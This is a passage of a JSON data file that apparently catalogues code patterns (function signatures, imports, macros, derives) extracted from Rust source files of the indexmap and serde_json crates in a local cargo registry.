          "double_ended_iterator_methods!(Bucket::key);",
          "iterator_methods!(Bucket::key);",
          "double_ended_iterator_methods!(Bucket::key);"
        ],
        "derives": [
          "#[derive(Clone)]"
        ],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-2.12.0/src/set/mutable.rs",
        "function_defs": [
          "fn get_full_mut2<Q>(&mut self, value: &Q) -> Option<(usize, &mut Self::Value)>",
          "fn get_index_mut2(&mut self, index: usize) -> Option<&mut Self::Value>;",
          "fn retain2<F>(&mut self, keep: F)",
          "fn get_full_mut2<Q>(&mut self, value: &Q) -> Option<(usize, &mut T)>",
          "fn get_index_mut2(&mut self, index: usize) -> Option<&mut T> {",
          "fn retain2<F>(&mut self, mut keep: F)"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use core::hash::{BuildHasher, Hash};",
          "use super::{Equivalent, IndexSet};",
          "use crate::map::MutableKeys;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 4
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-2.12.0/src/set/tests.rs",
        "function_defs": [
          "fn it_works() {",
          "fn new() {",
          "fn insert() {",
          "fn insert_full() {",
          "fn insert_2() {",
          "fn insert_dup() {",
          "fn insert_order() {",
          "fn shift_insert() {",
          "fn replace() {",
          "fn replace_full() {",
          "fn replace_2() {",
          "fn replace_dup() {",
          "fn replace_order() {",
          "fn replace_change() {",
          "fn grow() {",
          "fn reserve() {",
          "fn try_reserve() {",
          "fn shrink_to_fit() {",
          "fn remove() {",
          "fn swap_remove_index() {",
          "fn partial_eq_and_eq() {",
          "fn extend() {",
          "fn comparisons() {",
          "fn iter_comparisons() {",
          "fn check<'a, I1, I2>(iter1: I1, iter2: I2)",
          "fn ops() {",
          "fn from_array() {",
          "fn iter_default() {",
          "fn assert_default<T>()",
          "fn take() {",
          "fn swap_take() {",
          "fn sort_unstable() {",
          "fn try_reserve_exact() {",
          "fn shift_remove_full() {",
          "fn shift_remove_index() {",
          "fn sort_unstable_by() {",
          "fn sort_by() {",
          "fn drain() {",
          "fn split_off() {",
          "fn retain() {",
          "fn first() {",
          "fn sort_by_key() {",
          "fn sort_unstable_by_key() {",
          "fn sort_by_cached_key() {",
          "fn insert_sorted() {",
          "fn binary_search() {",
          "fn sorted_unstable_by() {",
          "fn last() {",
          "fn get_range() {",
          "fn shift_take() {",
          "fn test_binary_search_by() {",
          "fn test_binary_search_by_key() {",
          "fn test_partition_point() {",
          "fn is_sorted() {",
          "fn expect(set: &IndexSet<i32>, e: [bool; 4]) {",
          "fn is_sorted_trivial() {",
          "fn expect(set: &IndexSet<i32>, e: [bool; 5]) {"
        ],
        "struct_defs": [
          "struct Item;"
        ],
        "impl_blocks": [],
        "uses": [
          "use super::*;",
          "use std::string::String;",
          "use std::iter::empty;"
        ],
        "macros": [
          "assert_eq!(set.is_empty(), true);",
          "assert_eq!(set.len(), 1);",
          "assert!(set.get(&1).is_some());",
          "assert_eq!(set.is_empty(), false);",
          "println!(\"{:?}\", set);",
          "assert_eq!(set.capacity(), 0);",
          "assert_eq!(set.len(), 0);",
          "assert_eq!(set.is_empty(), true);",
          "assert_eq!(set.len(), i);",
          "assert_eq!(set.len(), i + 1);",
          "assert_eq!(set.get(&elt), Some(&elt));",
          "println!(\"{:?}\", set);",
          "assert!(set.get(&elt).is_none());",
          "assert_eq!(set.len(), i);",
          "assert!(success);",
          "assert_eq!(Some(index), set.get_full(&elt).map(|x| x.0));",
          "assert_eq!(set.len(), i + 1);",
          "assert!(!success);",
          "assert_eq!(Some(index), set.get_full(&elt).map(|x| x.0));",
          "assert_eq!(set.len(), len);",
          "values.extend(if cfg!(miri) { 32..64 } else { 128..267 });",
          "println!(\"old_set: {:?}\", old_set);",
          "println!(\"set: {:?}\", set);",
          "panic!(\"did not find {} in set\", value);",
          "assert!(set.get(&i).is_some(), \"did not find {}\", i);",
          "assert_eq!(set.len(), 5);",
          "assert_eq!(i, 0);",
          "assert_eq!(*v, 0);",
          "assert_eq!(set.len(), 5);",
          "assert_eq!(inserted, false);",
          "assert_eq!(i, 0);",
          "assert_eq!(*v, 0);",
          "assert_eq!(set.iter().count(), set.len());",
          "assert_eq!(set.iter().count(), insert.len());",
          "assert_eq!(a, b);",
          "assert_eq!(set.get_index(i).unwrap(), v);",
          "assert_eq!(set.iter().count(), set.len());",
          "assert_eq!(set.iter().count(), insert.len());",
          "assert_eq!(a, b);",
          "assert_eq!(set.get_index(i).unwrap(), v);",
          "assert_eq!(set.iter().count(), insert.len());",
          "assert_eq!(insert[0], set[0]);",
          "assert_eq!(a, b);",
          "assert_eq!(set.len(), i);",
          "assert_eq!(set.len(), i + 1);",
          "assert_eq!(set.get(&elt), Some(&elt));",
          "println!(\"{:?}\", set);",
          "assert!(set.get(&elt).is_none());",
          "assert_eq!(set.len(), i);",
          "assert!(replaced.is_none());",
          "assert_eq!(Some(index), set.get_full(&elt).map(|x| x.0));",
          "assert_eq!(set.len(), i + 1);",
          "assert_eq!(Some(elt), replaced);",
          "assert_eq!(Some(index), set.get_full(&elt).map(|x| x.0));",
          "assert_eq!(set.len(), len);",
          "values.extend(if cfg!(miri) { 32..64 } else { 128..267 });",
          "println!(\"old_set: {:?}\", old_set);",
          "println!(\"set: {:?}\", set);",
          "panic!(\"did not find {} in set\", value);",
          "assert!(set.get(&i).is_some(), \"did not find {}\", i);",
          "assert_eq!(set.len(), 5);",
          "assert_eq!(i, 0);",
          "assert_eq!(*v, 0);",
          "assert_eq!(set.len(), 5);",
          "assert_eq!(replaced, Some(0));",
          "assert_eq!(i, 0);",
          "assert_eq!(*v, 0);",
          "assert_eq!(set.iter().count(), set.len());",
          "assert_eq!(set.iter().count(), replace.len());",
          "assert_eq!(a, b);",
          "assert_eq!(set.get_index(i).unwrap(), v);",
          "let mut set = indexset!(vec![42]);",
          "assert_ne!(old_ptr, new_ptr);",
          "assert_eq!(replaced.as_ptr(), old_ptr);",
          "assert_eq!(set.len(), i);",
          "assert_eq!(set.len(), i + 1);",
          "assert_eq!(set.get(&elt), Some(&elt));",
          "println!(\"{:?}\", set);",
          "println!(\"{:?}\", set);",
          "assert!(set.get(&elt).is_none());",
          "assert_eq!(set.capacity(), 0);",
          "assert!(capacity >= 100);",
          "assert_eq!(set.len(), i);",
          "assert_eq!(set.len(), i + 1);",
          "assert_eq!(set.capacity(), capacity);",
          "assert_eq!(set.get(&i), Some(&i));",
          "assert_eq!(set.len(), capacity + 1);",
          "assert!(set.capacity() > capacity);",
          "assert_eq!(set.get(&capacity), Some(&capacity));",
          "assert_eq!(set.capacity(), 0);",
          "assert_eq!(set.try_reserve(100), Ok(()));",
          "assert!(set.capacity() >= 100);",
          "assert!(set.try_reserve(usize::MAX).is_err());",
          "assert_eq!(set.capacity(), 0);",
          "assert_eq!(set.len(), i);",
          "assert_eq!(set.len(), i + 1);",
          "assert!(set.capacity() >= i + 1);",
          "assert_eq!(set.get(&i), Some(&i));",
          "assert_eq!(set.len(), i + 1);",
          "assert_eq!(set.capacity(), i + 1);",
          "assert_eq!(set.get(&i), Some(&i));",
          "assert_eq!(set.iter().count(), set.len());",
          "assert_eq!(set.iter().count(), insert.len());",
          "assert_eq!(a, b);",
          "assert!(set.swap_remove_full(&value).is_none());",
          "println!(\"{:?}\", set);",
          "//println!(\"{:?}\", set);",
          "assert_eq!(set.swap_remove_full(&value), Some((index, value)));",
          "println!(\"{:?}\", set);",
          "assert_eq!(set.get(value).is_some(), !remove.contains(value));",
          "assert_eq!(set.len(), insert.len() - remove.len());",
          "assert_eq!(set.iter().count(), insert.len() - remove.len());",
          "assert_eq!(out_vec, out_set);",
          "assert_eq!(vector.len(), set.len());",
          "assert_eq!(a, b);",
          "assert_eq!(set_a, set_b);",
          "assert_ne!(set_a, set_b);",
          "assert_ne!(set_a, set_c);",
          "assert_ne!(set_c, set_a);",
          "assert_eq!(set.into_iter().collect::<Vec<_>>(), vec![1, 2, 3, 4, 5, 6]);",
          "assert!(!set_a.is_disjoint(&set_a));",
          "assert!(set_a.is_subset(&set_a));",
          "assert!(set_a.is_superset(&set_a));",
          "assert!(set_a.is_disjoint(&set_b));",
          "assert!(set_b.is_disjoint(&set_a));",
          "assert!(!set_a.is_subset(&set_b));",
          "assert!(!set_b.is_subset(&set_a));",
          "assert!(!set_a.is_superset(&set_b));",
          "assert!(!set_b.is_superset(&set_a));",
          "assert!(!set_a.is_disjoint(&set_c));",
          "assert!(!set_c.is_disjoint(&set_a));",
          "assert!(set_a.is_subset(&set_c));",
          "assert!(!set_c.is_subset(&set_a));",
          "assert!(!set_a.is_superset(&set_c));",
          "assert!(set_c.is_superset(&set_a));",
          "assert!(!set_c.is_disjoint(&set_d));",
          "assert!(!set_d.is_disjoint(&set_c));",
          "assert!(!set_c.is_subset(&set_d));",
          "assert!(!set_d.is_subset(&set_c));",
          "assert!(!set_c.is_superset(&set_d));",
          "assert!(!set_d.is_superset(&set_c));",
          "assert!(iter1.copied().eq(iter2));",
          "assert_eq!(&set_a & &set_a, set_a);",
          "assert_eq!(&set_a | &set_a, set_a);",
          "assert_eq!(&set_a ^ &set_a, empty);",
          "assert_eq!(&set_a - &set_a, empty);",
          "assert_eq!(&set_a & &set_b, empty);",
          "assert_eq!(&set_b & &set_a, empty);",
          "assert_eq!(&set_a | &set_b, set_c);",
          "assert_eq!(&set_b | &set_a, set_c);",
          "assert_eq!(&set_a ^ &set_b, set_c);",
          "assert_eq!(&set_b ^ &set_a, set_c);",
          "assert_eq!(&set_a - &set_b, set_a);",
          "assert_eq!(&set_b - &set_a, set_b);",
          "assert_eq!(&set_a & &set_c, set_a);",
          "assert_eq!(&set_c & &set_a, set_a);",
          "assert_eq!(&set_a | &set_c, set_c);",
          "assert_eq!(&set_c | &set_a, set_c);",
          "assert_eq!(&set_a ^ &set_c, set_b);",
          "assert_eq!(&set_c ^ &set_a, set_b);",
          "assert_eq!(&set_a - &set_c, empty);",
          "assert_eq!(&set_c - &set_a, set_b);",
          "assert_eq!(&set_c & &set_d, set_b);",
          "assert_eq!(&set_d & &set_c, set_b);",
          "assert_eq!(&set_c | &set_d, &set_a | &set_d);",
          "assert_eq!(&set_d | &set_c, &set_a | &set_d);",
          "assert_eq!(&set_c ^ &set_d, &set_a | &(&set_d - &set_b));",
          "assert_eq!(&set_d ^ &set_c, &set_a | &(&set_d - &set_b));",
          "assert_eq!(&set_c - &set_d, set_a);",
          "assert_eq!(&set_d - &set_c, &set_d - &set_b);",
          "assert_eq!(set1, set2);",
          "assert!(T::default().next().is_none());",
          "assert_eq!(index_set.len(), 1);",
          "assert_eq!(result, Some(10));",
          "assert_eq!(index_set.len(), 0);",
          "assert_eq!(result, None);",
          "assert_eq!(index_set.len(), 4);",
          "assert_eq!(result, Some(20));",
          "assert_eq!(index_set.len(), 3);",
          "assert_eq!(index_set.as_slice(), &[10, 40, 30]);",
          "assert_eq!(result, None);",
          "assert_eq!(index_set.as_slice(), &[10, 20, 30]);",
          "assert_eq!(index_set.capacity(), 3);",
          "assert_eq!(index_set.capacity(), 5);",
          "assert_eq!(result, Some((1, 20)));",
          "assert_eq!(set.len(), 4);",
          "assert_eq!(set.as_slice(), &[10, 30, 40, 50]);",
          "assert_eq!(result, Some((3, 50)));",
          "assert_eq!(set.len(), 3);",
          "assert_eq!(set.as_slice(), &[10, 30, 40]);",
          "assert_eq!(result, None);",
          "assert_eq!(set.len(), 3);",
          "assert_eq!(set.as_slice(), &[10, 30, 40]);",
          "assert_eq!(result, Some(20));",
          "assert_eq!(set.len(), 4);",
          "assert_eq!(set.as_slice(), &[10, 30, 40, 50]);",
          "assert_eq!(result, Some(30));",
          "assert_eq!(set.len(), 3);",
          "assert_eq!(set.as_slice(), &[10, 40, 50]);",
          "assert_eq!(result, None);",
          "assert_eq!(set.len(), 3);",
          "assert_eq!(set.as_slice(), &[10, 40, 50]);",
          "assert_eq!(set.as_slice(), &[10, 9, 8, 7, 6, 5, 4, 3, 2, 1]);",
          "assert_eq!(set.as_slice(), &[1, 2, 3]);",
          "assert_eq!(drain.as_slice(), &[1, 2]);",
          "assert_eq!(set.len(), 1);",
          "assert_eq!(set.as_slice(), &[3]);",
          "assert_eq!(split_set.len(), 2);",
          "assert_eq!(split_set.as_slice(), &[4, 5]);",
          "assert_eq!(set.len(), 3);",
          "assert_eq!(set.as_slice(), &[1, 2, 3]);",
          "assert_eq!(set.len(), 6);",
          "assert_eq!(set.as_slice(), &[5, 6, 7, 8, 9, 10]);",
          "assert_eq!(set.len(), 0);",
          "assert_eq!(*result.unwrap(), 10);",
          "assert!(result.is_none());",
          "assert_eq!(index_set.as_slice(), &[3, 2, 1, 0]);",
          "assert_eq!(index_set.as_slice(), &[3, 2, 1, 0]);",
          "assert_eq!(index_set.as_slice(), &[3, 2, 1, 0]);",
          "assert_eq!(set.insert_sorted(2), (1, true));",
          "assert_eq!(result, Ok(2));",
          "assert_eq!(result, Err(4));",
          "assert_eq!(set.as_slice(), &[10, 9, 8, 7, 6, 5, 4, 3, 2, 1]);",
          "assert_eq!(set.last(), Some(&6));",
          "assert_eq!(set.last(), Some(&5));",
          "assert_eq!(set.last(), None);",
          "assert_eq!(slice, &[1, 2, 3]);",
          "assert_eq!(result.unwrap().len(), 0);",
          "assert!(result.is_none());",
          "assert_eq!(result, Some(2));",
          "assert_eq!(set.len(), 4);",
          "assert_eq!(set.as_slice(), &[1, 3, 4, 5]);",
          "assert_eq!(result, Some(5));",
          "assert_eq!(set.len(), 3);",
          "assert_eq!(set.as_slice(), &[1, 3, 4]);",
          "assert_eq!(result, None);",
          "assert_eq!(set.len(), 3);",
          "assert_eq!(set.as_slice(), &[1, 3, 4]);",
          "assert_eq!(b.binary_search_by(|x| x.cmp(&5)), Err(0));",
          "assert_eq!(b.binary_search_by(|x| x.cmp(&3)), Err(0));",
          "assert_eq!(b.binary_search_by(|x| x.cmp(&4)), Ok(0));",
          "assert_eq!(b.binary_search_by(|x| x.cmp(&5)), Err(1));",
          "assert_eq!(b.binary_search_by(|x| x.cmp(&5)), Err(3));",
          "assert_eq!(b.binary_search_by(|x| x.cmp(&6)), Ok(3));",
          "assert_eq!(b.binary_search_by(|x| x.cmp(&7)), Err(4));",
          "assert_eq!(b.binary_search_by(|x| x.cmp(&8)), Ok(4));",
          "assert_eq!(b.binary_search_by(|x| x.cmp(&9)), Err(6));",
          "assert_eq!(b.binary_search_by(|x| x.cmp(&6)), Ok(3));",
          "assert_eq!(b.binary_search_by(|x| x.cmp(&5)), Err(3));",
          "assert_eq!(b.binary_search_by(|x| x.cmp(&8)), Ok(5));",
          "assert_eq!(b.binary_search_by(|x| x.cmp(&7)), Err(5));",
          "assert_eq!(b.binary_search_by(|x| x.cmp(&0)), Err(0));",
          "assert_eq!(b.binary_search_by(|x| x.cmp(&0)), Err(0));",
          "assert_eq!(b.binary_search_by(|x| x.cmp(&1)), Ok(0));",
          "assert_eq!(b.binary_search_by(|x| x.cmp(&2)), Err(1));",
          "assert!(match b.binary_search_by(|x| x.cmp(&3)) {",
          "assert!(match b.binary_search_by(|x| x.cmp(&3)) {",
          "assert_eq!(b.binary_search_by(|x| x.cmp(&4)), Err(2));",
          "assert_eq!(b.binary_search_by(|x| x.cmp(&5)), Err(2));",
          "assert_eq!(b.binary_search_by(|x| x.cmp(&6)), Err(2));",
          "assert_eq!(b.binary_search_by(|x| x.cmp(&7)), Ok(2));",
          "assert_eq!(b.binary_search_by(|x| x.cmp(&8)), Err(3));",
          "assert_eq!(b.binary_search_by_key(&5, |&x| x), Err(0));",
          "assert_eq!(b.binary_search_by_key(&3, |&x| x), Err(0));",
          "assert_eq!(b.binary_search_by_key(&4, |&x| x), Ok(0));",
          "assert_eq!(b.binary_search_by_key(&5, |&x| x), Err(1));",
          "assert_eq!(b.binary_search_by_key(&5, |&x| x), Err(3));",
          "assert_eq!(b.binary_search_by_key(&6, |&x| x), Ok(3));",
          "assert_eq!(b.binary_search_by_key(&7, |&x| x), Err(4));",
          "assert_eq!(b.binary_search_by_key(&8, |&x| x), Ok(4));",
          "assert_eq!(b.binary_search_by_key(&9, |&x| x), Err(6));",
          "assert_eq!(b.binary_search_by_key(&6, |&x| x), Ok(3));",
          "assert_eq!(b.binary_search_by_key(&5, |&x| x), Err(3));",
          "assert_eq!(b.binary_search_by_key(&8, |&x| x), Ok(5));",
          "assert_eq!(b.binary_search_by_key(&7, |&x| x), Err(5));",
          "assert_eq!(b.binary_search_by_key(&0, |&x| x), Err(0));",
          "assert_eq!(b.binary_search_by_key(&0, |&x| x), Err(0));",
          "assert_eq!(b.binary_search_by_key(&1, |&x| x), Ok(0));",
          "assert_eq!(b.binary_search_by_key(&2, |&x| x), Err(1));",
          "assert!(match b.binary_search_by_key(&3, |&x| x) {",
          "assert!(match b.binary_search_by_key(&3, |&x| x) {",
          "assert_eq!(b.binary_search_by_key(&4, |&x| x), Err(2));",
          "assert_eq!(b.binary_search_by_key(&5, |&x| x), Err(2));",
          "assert_eq!(b.binary_search_by_key(&6, |&x| x), Err(2));",
          "assert_eq!(b.binary_search_by_key(&7, |&x| x), Ok(2));",
          "assert_eq!(b.binary_search_by_key(&8, |&x| x), Err(3));",
          "assert_eq!(b.partition_point(|&x| x < 5), 0);",
          "assert_eq!(b.partition_point(|&x| x < 3), 0);",
          "assert_eq!(b.partition_point(|&x| x < 4), 0);",
          "assert_eq!(b.partition_point(|&x| x < 5), 1);",
          "assert_eq!(b.partition_point(|&x| x < 5), 3);",
          "assert_eq!(b.partition_point(|&x| x < 6), 3);",
          "assert_eq!(b.partition_point(|&x| x < 7), 4);",
          "assert_eq!(b.partition_point(|&x| x < 8), 4);",
          "assert_eq!(b.partition_point(|&x| x < 9), 6);",
          "assert_eq!(b.partition_point(|&x| x < 6), 3);",
          "assert_eq!(b.partition_point(|&x| x < 5), 3);",
          "assert_eq!(b.partition_point(|&x| x < 8), 5);",
          "assert_eq!(b.partition_point(|&x| x < 7), 5);",
          "assert_eq!(b.partition_point(|&x| x < 0), 0);",
          "assert_eq!(b.partition_point(|&x| x < 0), 0);",
          "assert_eq!(b.partition_point(|&x| x < 1), 0);",
          "assert_eq!(b.partition_point(|&x| x < 2), 1);",
          "assert_eq!(b.partition_point(|&x| x < 3), 1);",
          "assert_eq!(b.partition_point(|&x| x < 4), 2); // diff from std as set merges the",
          "assert_eq!(b.partition_point(|&x| x < 5), 2);",
          "assert_eq!(b.partition_point(|&x| x < 6), 2);",
          "assert_eq!(b.partition_point(|&x| x < 7), 2);",
          "assert_eq!(b.partition_point(|&x| x < 8), 3);",
          "assert_eq!(e[0], set.is_sorted());",
          "assert_eq!(e[1], set.is_sorted_by(|v1, v2| v1 < v2));",
          "assert_eq!(e[2], set.is_sorted_by(|v1, v2| v1 > v2));",
          "assert_eq!(e[3], set.is_sorted_by_key(|v| v));",
          "assert_eq!(e[0], set.is_sorted());",
          "assert_eq!(e[1], set.is_sorted_by(|_, _| true));",
          "assert_eq!(e[2], set.is_sorted_by(|_, _| false));",
          "assert_eq!(e[3], set.is_sorted_by_key(|_| 0f64));",
          "assert_eq!(e[4], set.is_sorted_by_key(|_| f64::NAN));"
        ],
        "derives": [],
        "error_handling": 31
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-2.12.0/src/map/core/raw_entry_v1.rs",
        "function_defs": [
          "fn raw_entry_v1(&self) -> RawEntryBuilder<'_, K, V, S>;",
          "fn raw_entry_mut_v1(&mut self) -> RawEntryBuilderMut<'_, K, V, S>;",
          "fn raw_entry_v1(&self) -> RawEntryBuilder<'_, K, V, S> {",
          "fn raw_entry_mut_v1(&mut self) -> RawEntryBuilderMut<'_, K, V, S> {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn into_ref_mut(self) -> RefMut<'a, K, V> {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use super::{Entries, RefMut};",
          "use crate::{Equivalent, HashValue, IndexMap};",
          "use core::fmt;",
          "use core::hash::{BuildHasher, Hash};",
          "use core::marker::PhantomData;",
          "use core::mem;",
          "use hashbrown::hash_table;",
          "use `swap_remove` or `shift_remove` for explicit behavior.\")]",
          "use `swap_remove_entry` or `shift_remove_entry` for explicit behavior.\")]"
        ],
        "macros": [
          "///     println!(\"Key: {} and value: {:?}\", k, v);",
          "///     assert_eq!(map.raw_entry_v1().from_key(k), kv);",
          "///     assert_eq!(map.raw_entry_v1().from_hash(hash, |q| *q == k), kv);",
          "///     assert_eq!(map.raw_entry_v1().from_key_hashed_nocheck(hash, k), kv);",
          "///     assert_eq!(map.raw_entry_v1().from_hash_full(hash, |q| *q == k), ikv);",
          "///     assert_eq!(map.raw_entry_v1().index_from_hash(hash, |q| *q == k), i);",
          "///     RawEntryMut::Vacant(_) => unreachable!(),",
          "///         assert_eq!(view.index(), 0);",
          "///         assert_eq!(view.get(), &100);",
          "///         assert_eq!(view.insert(1111), 1000);",
          "/// assert_eq!(map[\"a\"], 1111);",
          "/// assert_eq!(map.len(), 3);",
          "///     RawEntryMut::Vacant(_) => unreachable!(),",
          "///         assert_eq!(view.index(), 2);",
          "///         assert_eq!(view.shift_remove_entry(), (\"c\", 300));",
          "/// assert_eq!(map.raw_entry_v1().from_key(\"c\"), None);",
          "/// assert_eq!(map.len(), 2);",
          "///     RawEntryMut::Occupied(_) => unreachable!(),",
          "///         assert_eq!(view.index(), 2);",
          "///         assert_eq!((*k, *value), (\"d\", 4000));",
          "/// assert_eq!(map[\"d\"], 40000);",
          "/// assert_eq!(map.len(), 3);",
          "///     RawEntryMut::Vacant(_) => unreachable!(),",
          "///         assert_eq!(view.index(), 2);",
          "///         assert_eq!(view.swap_remove_entry(), (\"d\", 40000));",
          "/// assert_eq!(map.get(\"d\"), None);",
          "/// assert_eq!(map.len(), 2);"
        ],
        "derives": [],
        "error_handling": 18
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-2.12.0/src/map/core/extract.rs",
        "function_defs": [
          "fn drop(&mut self) {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use super::{Bucket, IndexMapCore};",
          "use crate::util::simplify_range;",
          "use core::ops::RangeBounds;"
        ],
        "macros": [
          "assert_eq!(self.entries.len(), self.indices.len());",
          "debug_assert!(new_len <= self.current);",
          "debug_assert!(self.current <= self.end);",
          "debug_assert!(self.current <= old_len);",
          "debug_assert!(old_len <= self.map.entries.capacity());",
          "debug_assert!(self.end <= self.map.entries.capacity());",
          "debug_assert!(self.new_len < self.current);"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-2.12.0/src/map/core/entry.rs",
        "function_defs": [
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn into_ref_mut(self) -> RefMut<'a, K, V> {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn from(other: IndexedEntry<'a, K, V>) -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn from(other: OccupiedEntry<'a, K, V>) -> Self {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use super::{equivalent, Entries, IndexMapCore, RefMut};",
          "use crate::HashValue;",
          "use core::cmp::Ordering;",
          "use core::{fmt, mem};",
          "use hashbrown::hash_table;",
          "use `swap_remove` or `shift_remove` for explicit behavior.\")]",
          "use `swap_remove_entry` or `shift_remove_entry` for explicit behavior.\")]"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 11
      }
    ],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145",
    "name": "serde_json-1.0.145",
    "languages": [
      "Rust"
    ],
    "python_patterns": [],
    "rust_patterns": [
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/build.rs",
        "function_defs": [
          "fn main() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::env;"
        ],
        "macros": [
          "println!(\"cargo:rerun-if-changed=build.rs\");",
          "println!(\"cargo:rustc-check-cfg=cfg(fast_arithmetic, values(\\\"32\\\", \\\"64\\\"))\");",
          "println!(\"cargo:rustc-cfg=fast_arithmetic=\\\"64\\\"\");",
          "println!(\"cargo:rustc-cfg=fast_arithmetic=\\\"32\\\"\");"
        ],
        "derives": [],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/tests/stream.rs",
        "function_defs": [
          "fn test_json_stream_newlines() {",
          "fn test_json_stream_trailing_whitespaces() {",
          "fn test_json_stream_truncated() {",
          "fn test_json_stream_truncated_decimal() {",
          "fn test_json_stream_truncated_negative() {",
          "fn test_json_stream_truncated_exponent() {",
          "fn test_json_stream_empty() {",
          "fn test_json_stream_primitive() {",
          "fn test_json_stream_invalid_literal() {",
          "fn test_json_stream_invalid_number() {",
          "fn test_error() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use serde_json::{json, Deserializer, Value};"
        ],
        "macros": [
          "assert_eq!($stream.byte_offset(), 0);",
          "assert_eq!($stream.byte_offset(), 0);",
          "assert_eq!($stream.byte_offset(), 0);",
          "test_stream!(data, Value, |stream| {",
          "assert_eq!(stream.next().unwrap().unwrap()[\"x\"], 39);",
          "assert_eq!(stream.byte_offset(), 8);",
          "assert_eq!(stream.next().unwrap().unwrap()[\"x\"], 40);",
          "assert_eq!(stream.byte_offset(), 17);",
          "assert_eq!(stream.next().unwrap().unwrap()[\"x\"], 41);",
          "assert_eq!(stream.byte_offset(), 25);",
          "assert_eq!(stream.next().unwrap().unwrap()[\"x\"], 42);",
          "assert_eq!(stream.byte_offset(), 34);",
          "assert!(stream.next().is_none());",
          "assert_eq!(stream.byte_offset(), 34);",
          "test_stream!(data, Value, |stream| {",
          "assert_eq!(stream.next().unwrap().unwrap()[\"x\"], 42);",
          "assert_eq!(stream.byte_offset(), 8);",
          "assert!(stream.next().is_none());",
          "assert_eq!(stream.byte_offset(), 11);",
          "test_stream!(data, Value, |stream| {",
          "assert_eq!(stream.next().unwrap().unwrap()[\"x\"], 40);",
          "assert_eq!(stream.byte_offset(), 8);",
          "assert!(stream.next().unwrap().unwrap_err().is_eof());",
          "assert_eq!(stream.byte_offset(), 9);",
          "test_stream!(data, Value, |stream| {",
          "assert!(stream.next().unwrap().unwrap_err().is_eof());",
          "assert_eq!(stream.byte_offset(), 0);",
          "test_stream!(data, Value, |stream| {",
          "assert!(stream.next().unwrap().unwrap_err().is_eof());",
          "assert_eq!(stream.byte_offset(), 0);",
          "test_stream!(data, Value, |stream| {",
          "assert!(stream.next().unwrap().unwrap_err().is_eof());",
          "assert_eq!(stream.byte_offset(), 0);",
          "test_stream!(data, Value, |stream| {",
          "assert!(stream.next().is_none());",
          "assert_eq!(stream.byte_offset(), 0);",
          "test_stream!(data, Value, |stream| {",
          "assert_eq!(stream.next().unwrap().unwrap(), json!({}));",
          "assert_eq!(stream.byte_offset(), 2);",
          "assert_eq!(stream.next().unwrap().unwrap(), true);",
          "assert_eq!(stream.byte_offset(), 7);",
          "assert_eq!(stream.next().unwrap().unwrap(), json!({}));",
          "assert_eq!(stream.byte_offset(), 9);",
          "assert_eq!(stream.next().unwrap().unwrap(), 1);",
          "assert_eq!(stream.byte_offset(), 10);",
          "assert_eq!(stream.next().unwrap().unwrap(), json!([]));",
          "assert_eq!(stream.byte_offset(), 12);",
          "assert_eq!(stream.next().unwrap().unwrap(), false);",
          "assert_eq!(stream.byte_offset(), 18);",
          "assert_eq!(stream.next().unwrap().unwrap(), \"hey\");",
          "assert_eq!(stream.byte_offset(), 23);",
          "assert_eq!(stream.next().unwrap().unwrap(), 2);",
          "assert_eq!(stream.byte_offset(), 24);",
          "assert!(stream.next().is_none());",
          "assert_eq!(stream.byte_offset(), 25);",
          "test_stream!(data, Value, |stream| {",
          "assert_eq!(second.to_string(), \"trailing characters at line 1 column 5\");",
          "test_stream!(data, Value, |stream| {",
          "assert_eq!(second.to_string(), \"trailing characters at line 1 column 2\");",
          "test_stream!(data, Value, |stream| {",
          "assert_eq!(stream.next().unwrap().unwrap(), true);",
          "assert!(stream.next().unwrap().is_err());",
          "assert!(stream.next().is_none());"
        ],
        "derives": [],
        "error_handling": 22
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/tests/test.rs",
        "function_defs": [
          "fn test_encode_ok<T>(errors: &[(T, &str)])",
          "fn test_pretty_encode_ok<T>(errors: &[(T, &str)])",
          "fn test_write_null() {",
          "fn test_write_u64() {",
          "fn test_write_i64() {",
          "fn test_write_f64() {",
          "fn test_encode_nonfinite_float_yields_null() {",
          "fn test_write_str() {",
          "fn test_write_bool() {",
          "fn test_write_char() {",
